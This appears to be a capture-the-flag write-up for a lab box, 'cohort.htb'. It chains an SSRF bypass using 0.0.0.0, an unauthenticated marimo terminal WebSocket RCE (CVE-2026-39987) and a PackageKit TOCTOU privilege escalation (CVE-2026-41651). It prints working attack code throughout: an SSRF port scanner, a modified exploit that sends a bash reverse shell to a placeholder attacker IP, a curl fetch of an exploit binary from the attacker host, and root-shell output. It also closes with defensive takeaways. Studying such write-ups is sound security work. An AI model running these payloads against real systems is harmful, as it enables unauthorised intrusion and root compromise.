A URL-validation API is vulnerable to SSRF: it blocks `127.0.0.1` but accepts `0.0.0.0`, which is enough to scan internal ports and read a `/status` endpoint that is 403 from outside. That status page leaks an internal notebook subdomain running **marimo 0.20.4**, which exposes an unauthenticated terminal WebSocket — **CVE-2026-39987** — for a `marimo` foothold. A vulnerable **PackageKit** build then falls to a TOCTOU race (**CVE-2026-41651**) that installs a root-owned package setting SUID on `bash`, giving root.

## Reconnaissance & Enumeration

The objective of this phase was to enumerate the exposed services and identify the entry point.

### Host Discovery

A single ICMP probe confirmed reachability and hinted at the OS:

```bash
ping -c 1 10.129.107.34
PING 10.129.107.34 (10.129.107.34) 56(84) bytes of data.
64 bytes from 10.129.107.34: icmp_seq=1 ttl=63 time=42.3 ms
```

A TTL of 63 indicates a Linux host (default 64, decremented once across the VPN routing hop).

### Port Scan

The standard two-stage nmap pattern — a full SYN sweep first, then a targeted service scan on the open ports.

Stage 1, all 65535 TCP ports at a high packet rate, output to a grepable file:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.107.34 -oG allPorts
[...]
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

Three ports. Stage 2 ran default scripts and version detection against them:

```bash
sudo nmap -p22,80,443 -sCV 10.129.107.34 -oN nmap
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
|_http-title: Did not follow redirect to https://cohort.htb/
```

Three takeaways. SSH is a current OpenSSH on Ubuntu — no direct entry point. Both HTTP and HTTPS redirect to `https://cohort.htb/`, which is name-based virtual hosting, so the domain went into `/etc/hosts`:

```bash
echo "10.129.107.34 cohort.htb" | sudo tee -a /etc/hosts
```

And the TLS certificate carries a **wildcard SAN** — `DNS:*.cohort.htb`. That single line pre-discloses that the operator expects to use subdomains; finding them becomes a priority later.

### Web Enumeration

A content scan against the HTTPS vhost (skipping TLS validation on the self-signed cert and filtering the default response size) mapped the routes:

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u https://cohort.htb/ --no-tls-validation -x html --exclude-length 908
api                  (Status: 301) [Size: 178] [--> https://cohort.htb/api/]
assets               (Status: 301) [Size: 178] [--> https://cohort.htb/assets/]
portal.html          (Status: 200) [Size: 907]
status               (Status: 403) [Size: 162]
```

Two entries stand out. There is an `/api/` surface, and a `/status` endpoint that returns **403 Forbidden** — nginx is refusing external access to it, which usually means it's meant to be reachable only from localhost. Both become relevant once an SSRF primitive is in hand.

## Exploitation

### SSRF — `/api/validate` and the `0.0.0.0` bypass

Probing the API surface surfaced `/api/validate`, an endpoint that fetches a user-supplied URL server-side (to "validate" a data source) and returns a preview of the response. Any endpoint that fetches an attacker-controlled URL is a candidate for Server-Side Request Forgery. The developers clearly anticipated this and added a blocklist for internal/loopback addresses:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1","format":"csv"}' -k
{"ok": false, "message": "Internal or loopback addresses are not permitted."}
```

The blocklist rejects `127.0.0.1`, but blocklists that enumerate "loopback" by literal string are notoriously incomplete. `0.0.0.0` is the unspecified address; for an **outbound** connection on Linux it resolves to the local host, yet it doesn't match a naive `127.0.0.1`/`localhost` filter. It sailed straight through:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"https://0.0.0.0","format":"csv"}' -k
{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<!doctype html>\n<html lang=\"en\">\n[...]<title>Cohort Analytics</title>[...]", "message": "Source reachable."}
```

The server fetched its own front page on behalf of the request — SSRF confirmed. One more probe pinned down the scheme filter:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"file://0.0.0.0","format":"csv"}' -k
{"ok": false, "message": "Only http and https sources are supported."}
```

`file://` is blocked, so no local file reads — but arbitrary internal HTTP(S) fetching is wide open.

#### Mapping the internal attack surface

With `0.0.0.0` reaching localhost, the SSRF becomes an internal port scanner. Unreachable ports come back with a `Could not reach the source:` message, so a small script that fires the top ports through the API and filters on the absence of that string enumerates what's listening internally:

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

main_url = "https://cohort.htb/api/validate"
ports = [
    80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111, 995, 993, 5900, 1025, 587, 8888, 199, 1720, 465, 548, 113, 81, 6001,
    10000, 514, 5060, 179, 1026, 2000, 8443, 8000, 32768, 554, 26, 1433, 49152, 5432, 9100, 1027, 1024, 1029, 1028, 5000
]

def main():
    for port in ports:
        post_data = {'url': f"http://0.0.0.0:{port}", 'format': 'csv'}
        res = requests.post(main_url, json=post_data, verify=False)
        if not "Could not reach the source:" in res.text:
            print(f"Port {port} is open")

if __name__ == '__main__':
    main()
```

```bash
python3 portEnum.py
Port 80 is open
Port 443 is open
Port 22 is open
Port 8888 is open
Port 5000 is open
```

Two internal-only services appear on top of the public ports: **8888** and **5000**. Fetching `8888` through the SSRF returned a login page whose title gives it away — a **marimo** notebook:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"http://0.0.0.0:8888","format":"csv"}' -k
{"ok": true, "fetched_status": 200, "content_type": "text/html; charset=utf-8", "preview": "[...]<title>marimo</title>[...]<label for=\"password\">Access Token / Password</label>[...]", "message": "Source reachable."}
```

marimo exposes its version unauthenticated, and the SSRF reads it just fine:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"http://0.0.0.0:8888/api/version","format":"csv"}' -k
{"ok": true, "fetched_status": 200, "content_type": "text/plain; charset=utf-8", "preview": "0.20.4", "message": "Source reachable."}
```

**marimo 0.20.4**. That version is the lead — but the notebook sits behind a login and, as the `/status` upstream data will show, behind a specific vhost. Which brings the gobuster 403 back into play.

#### Chaining SSRF into the 403 `/status` endpoint

`/status` was 403 from the outside because nginx only allows it from localhost. The SSRF request *originates* from localhost, so fetching `/status` through it bypasses the restriction entirely:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"http://0.0.0.0/status","format":"csv"}' -k
{"ok": true, "fetched_status": 200, "content_type": "application/json",
 "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",
  \"upstreams\":[
    {\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},
    {\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},
    {\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",
     \"note\":\"internal analyst workspace, not for external use\"}]}"}
```

The status page is an nginx upstream map, and it hands over the missing piece: the marimo notebook (port 8888) is served on the vhost **`nb-1be3782a8afd3ad5.cohort.htb`**. The random-looking subdomain was acting as security-by-obscurity — impossible to guess with a wordlist, but the wildcard SAN already told us subdomains existed, and the SSRF just handed us the exact name. It went into `/etc/hosts`:

```bash
echo "10.129.107.34 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

With the correct `Host` header, nginx now routes straight to the marimo notebook and it renders directly in the browser — no SSRF needed from here on.

### CVE-2026-39987 — marimo Unauthenticated Terminal RCE

marimo 0.20.4 is vulnerable to **CVE-2026-39987**. marimo notebooks expose a terminal feature over a WebSocket at `/terminal/ws`, and in the affected version that socket is reachable **without authentication** — despite the "Access Token / Password" login gate on the HTTP front end. Anything written to the socket is executed as a shell command on the server, so a client that opens the WebSocket and sends a command line gets arbitrary command execution as the notebook's service account.

I based the exploit on the public PoC (`github.com/fevar54/marimo_CVE-2026-39987_RCE_PoC` / `rootdirective-sec/CVE-2026-39987-Lab`) and modified it — the upstream check only proved execution with `id`, so I swapped the command for a reverse shell and kept the socket open afterwards so the shell would survive:

```python
#!/usr/bin/env python3
import argparse
import re
import sys
import time
import urllib3
import ssl
from urllib.parse import urlparse

import websocket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def to_ws_url(base_url: str) -> str:
    parsed = urlparse(base_url)
    if parsed.scheme not in {"http", "https"}:
        raise ValueError("base-url must start with http:// or https://")
    ws_scheme = "wss" if parsed.scheme == "https" else "ws"
    netloc = parsed.netloc
    return f"{ws_scheme}://{netloc}/terminal/ws"


def recv_for(ws, seconds: float = 3.0) -> str:
    end = time.time() + seconds
    chunks = []
    while time.time() < end:
        try:
            chunk = ws.recv()
            if chunk:
                if isinstance(chunk, bytes):
                    chunk = chunk.decode("utf-8", errors="replace")
                chunks.append(chunk)
        except websocket.WebSocketTimeoutException:
            continue
        except Exception:
            break
    return "".join(chunks)


def clean_terminal_output(raw: str, marker_start: str, marker_end: str) -> str:
    # Remove common ANSI escape sequences from PTY output.
    raw = re.sub(r"\x1b\[[0-9;?]*[A-Za-z]", "", raw)
    raw = raw.replace("\r", "")
    if marker_start in raw and marker_end in raw:
        body = raw.split(marker_start, 1)[1].split(marker_end, 1)[0]
    else:
        body = raw
    lines = []
    for line in body.splitlines():
        line = line.strip()
        if not line:
            continue
        if marker_start in line or marker_end in line:
            continue
        if "printf" in line and "whoami" in line:
            continue
        if line.startswith("$"):
            continue
        lines.append(line)
    return "\n".join(lines).strip()


def main() -> int:
    parser = argparse.ArgumentParser(description="Least-harm local PoC for CVE-2026-39987.")
    parser.add_argument("--base-url", required=True,
                        help="Local marimo base URL, e.g. http://127.0.0.1:8081")
    args = parser.parse_args()

    try:
        ws_url = to_ws_url(args.base_url)
    except ValueError as e:
        print(f"[safety] {e}")
        return 2

    marker_start = "CVE39987_PROOF_START"
    marker_end = "CVE39987_PROOF_END"

    command = (
        "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'; "
        "id; "
        "whoami; "
        )

    print(f"[*] Target WebSocket: {ws_url}")
    print("[*] Sending benign proof command only: id; whoami; hostname")

    try:
        ws = websocket.create_connection(ws_url, timeout=4,
                                         sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False})
    except Exception as e:
        print(f"[-] websocket connection rejected/failed: {e}")
        print("[result] not exploitable by this unauthenticated check")
        return 0

    print("[+] websocket connected without credentials")

    try:
        ws.settimeout(0.3)
        recv_for(ws, 1.0)               # drain greeting / prompt noise
        ws.send(command + "\n")         # send the command as a terminal line
        raw = recv_for(ws, 4.0)
        proof = clean_terminal_output(raw, marker_start, marker_end)
        if "uid=" in proof:
            print("[result] VULNERABLE: unauthenticated command execution observed")
            print("[proof]")
            print(proof)
            return 0
        print("[result] websocket connected, but command proof was not captured cleanly")
        print("[raw-output]")
        print(raw)
        return 0
    finally:
        try:
            time.sleep(3600)            # keep the socket open so the reverse shell survives
            ws.close()
        except Exception:
            pass


if __name__ == "__main__":
    sys.exit(main())
```

The two changes that matter are in `command` — the first entry is the Bash reverse shell rather than a benign `id` — and the `time.sleep(3600)` in the `finally` block, which holds the WebSocket (and therefore the child shell) open instead of tearing it down immediately. Pointed at the notebook vhost:

```bash
python3 poc.py --base-url https://nb-1be3782a8afd3ad5.cohort.htb/
[*] Target WebSocket: wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
[+] websocket connected without credentials
[result] websocket connected, but command proof was not captured cleanly
```

The proof-capture logic couldn't parse the PTY output cleanly (the reverse shell fires before the `id`/`whoami` echo comes back), but that's cosmetic — the socket connected unauthenticated and the reverse shell had already executed.

A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable. `/etc/passwd` shows how locked-down the box is — the notebook account is `nologin` and only `root` carries an interactive shell:


The presence of `_laurel` (an auditd log processor) is a small tell that this box is logging aggressively — worth keeping payloads tidy, but not a blocker. With no obvious lateral target, the path to root runs through a local privilege escalation.

## Privilege Escalation — `marimo` → `root`

`sudo -l` was unavailable, there were no unusual SUID binaries, and no readable credentials turned up. The lead came from enumerating installed packages — one of them is held at a specific, known-vulnerable version:

```bash
marimo@cohort:/$ dpkg -l | grep "packagekit"
ii  gir1.2-packagekitglib-1.0   1.2.8-2ubuntu1.5   amd64   GObject introspection data for the PackageKit GLib library
ii  libpackagekit-glib2-18      1.2.8-2ubuntu1.5   amd64   Library for accessing PackageKit using GLib
hi  packagekit                  1.2.8-2ubuntu1.2   amd64   Provides a package management service
ii  packagekit-tools            1.2.8-2ubuntu1.2   amd64   Provides PackageKit command-line tools
```

The `hi` state on `packagekit` means the package is on **hold** at `1.2.8-2ubuntu1.2` — pinned one revision behind the `1.2.8-2ubuntu1.5` its GLib libraries were updated to. That deliberate downgrade-and-hold is the intended vector: this PackageKit build is vulnerable to **CVE-2026-41651**, a TOCTOU (time-of-check-to-time-of-use) local privilege escalation.

PackageKit's D-Bus service runs as root and exposes an `InstallFiles` method. The exploit (public PoC at `github.com/Vozec/CVE-2026-41651`) builds two `.deb` packages — a harmless `dummy` and a `payload` whose maintainer script sets SUID on `bash` — then issues two `InstallFiles` calls back-to-back: the first with the `SIMULATE` flag (which passes the lighter authorization check) and the second with no flag. The race is between PackageKit validating the transaction and actually acting on the files: in the affected version the window lets the real (non-simulated) install of the attacker's payload slip through even though the polkit prompt is ultimately denied, so the payload's maintainer script runs as root.

I pulled the compiled exploit over from a listener on my box:

```bash
marimo@cohort:~$ curl -s http://<ATTACKER_IP>:8000/cve-2026-41651 -o exploit
marimo@cohort:~$ chmod +x exploit
```

Running it wins the race and drops a SUID `bash`:

```bash
marimo@cohort:~$ ./exploit
═══════════════════════════════════════════════════
 CVE-2026-41651 — PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-36282.deb
[+] payload : /tmp/.pk-payload-36282.deb
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=not yet
[*] t+2s: payload=exists dpkg_lock=free suid=not yet

[+] SUCCESS — SUID bash at t+2300ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash-5.2#
```

The polkit `Failed to obtain authentication` is expected — the interactive prompt is denied, but the race already installed the payload before that denial mattered. The result is a `bash` with the SUID bit set and `euid=0`. Invoking it with `-p` preserves the effective UID and yields a root shell:

```bash
.suid_bash-5.2# whoami
root
.suid_bash-5.2# cat /root/root.txt
REDACTED
```

## Key Takeaways

- **SSRF blocklists that enumerate "localhost" by string are trivially bypassable.** Blocking `127.0.0.1` while forgetting `0.0.0.0` (and `[::1]`, `127.0.0.2`, decimal/hex encodings, DNS rebinding, redirects) is the norm, not the exception. `0.0.0.0` reached the loopback interface and turned a "validation" feature into an internal scanner and a bypass for an access-controlled endpoint.

- **An SSRF is only as contained as the internal network it can see.** The same primitive did three jobs here: port-scanned localhost, fingerprinted an internal service, and defeated nginx's IP-based 403 on `/status` — because the request originated from localhost. IP allow-listing is not a substitute for authentication when an SSRF can borrow the server's own origin.

- **Wildcard TLS certificates pre-disclose that subdomains exist.** `*.cohort.htb` didn't reveal the random `nb-1be3782a8afd3ad5` name, but it confirmed the hunt was worth it; the SSRF-leaked `/status` upstream map then handed over the exact vhost. A high-entropy subdomain is obscurity, not access control.

- **Authentication on the front door means nothing if a side door is unauthenticated.** marimo gated its HTTP UI behind an access token but left the `/terminal/ws` WebSocket open (CVE-2026-39987). Always enumerate every protocol a service speaks — the WebSocket terminal was the whole box.

- **A package pinned on `hold` one revision behind is a deliberate breadcrumb.** The `hi` flag in `dpkg -l` on `packagekit` was the clearest possible signal of an intended CVE; checking exact versions of privileged, root-running services (PackageKit's D-Bus daemon) is where local privesc enumeration pays off.

- **TOCTOU races defeat authorization checks that aren't atomic with the action they guard.** CVE-2026-41651 exploited the gap between PackageKit validating a transaction and performing the install; the polkit prompt was denied, yet the payload landed first. When a privileged operation checks then acts in two steps, the check is advisory unless the two are atomic.
